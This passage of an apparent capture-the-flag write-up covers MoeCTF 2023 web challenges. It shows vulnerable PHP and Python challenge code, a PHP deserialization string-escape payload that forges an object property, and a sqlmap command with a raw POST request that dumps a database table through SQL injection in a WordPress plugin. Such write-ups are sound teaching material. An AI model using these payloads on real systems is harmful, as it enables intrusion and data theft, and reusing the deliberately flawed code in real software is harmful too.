class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>    );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>            <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>通过<code>__toString()</code>满足if读flag<br><img src="/mdimg/moectf2023/32.png"><br><code>Make_a_Move</code>方法替换序列化之后的字符<br><code>di_jiu_qiang</code>长度12 替换为：<code>string(32) &quot;Night_Parade_of_a_Hundred_Ghosts&quot;</code>逃逸20<br>可以看到替换后Chant属性的字符长度没变<br>可以字符串逃逸<br><code>string(35) &quot;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;</code><br>需要逃逸35个字符<br><code>di_shi_san_qiang</code>16 –&gt;    <code>string(21) &quot;Unrepentant_Lethality&quot;</code>逃逸5<br>payload：<code>?chant=di_jiu_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p><img src="/mdimg/moectf2023/33.png"><br><code>[http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php](http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 不许偷看！这些代码我还在调试呢！</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 加载数据库配置，暂时用硬编码绝对路径</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// 数据库用户名</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// 数据库密码</span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// 数据库名称</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// 数据库主机</span><br><br><span class="hljs-comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><br><span class="hljs-comment">// 这些是临时的代码</span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接失败: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// 执行插入</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// 检查插入是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入成功&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br><br><span class="hljs-comment">//gpt真好用</span><br>数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to <span class="hljs-keyword">use</span> <span class="hljs-title">near</span> &#x27;)&#x27; <span class="hljs-title">at</span> <span class="hljs-title">line</span> 1<br></code></pre></td></tr></table></figure><p><code>sqlmap -r 1.txt --batch -D wordpress -T secret_of_kokomi  -C content --dump</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /wordpress/wp-content/plugins/visitor-logging/logger.php?http:%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">101.42.178.83:7770</span>%<span class="hljs-number">2</span>fwordpress%<span class="hljs-number">2</span>fwp-content%<span class="hljs-number">2</span>fplugins%<span class="hljs-number">2</span>fvisitor-logging%<span class="hljs-number">2</span>flogger.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">117</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">24</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">101.42.178.83:7770</span>/wordpress/wp-content/plugins/visitor-logging/logger.php<br><span class="hljs-attribute">Cookie</span>: comment_author_4c9aa5fddaa9877c73e1c45596fe15bd=a; comment_author_email_4c9aa5fddaa9877c73e1c45596fe15bd=a%<span class="hljs-number">40</span>a.com; comment_author_url_4c9aa5fddaa9877c73e1c45596fe15bd=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fa.com; wordpress_test_cookie=WP%<span class="hljs-number">20</span>Cookie%<span class="hljs-number">20</span>check<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">2</span>&amp;time=<span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/34.png"></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):      <span class="hljs-comment"># *items形参元组      </span><br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>)   <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())    <span class="hljs-comment">#生成字典</span><br><br><span class="hljs-built_in">eval</span>([[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> base64.b64encode <span class="hljs-keyword">in</span> [base64.b64decode]]) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0Z